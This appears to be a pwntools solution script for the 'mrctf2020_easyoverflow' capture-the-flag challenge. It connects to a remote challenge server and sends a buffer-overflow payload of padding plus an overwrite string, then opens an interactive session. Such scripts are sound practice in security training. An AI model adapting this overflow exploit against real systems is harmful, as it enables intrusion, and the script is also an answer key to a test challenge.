from pwn import *

#p = process('./mrctf2020_easyoverflow')
p = remote('node4.buuoj.cn', 29322)

payload = b'a' * 0x30 + b'n0t_r3@11y_f1@g'

p.sendline(payload)

p.interactive()
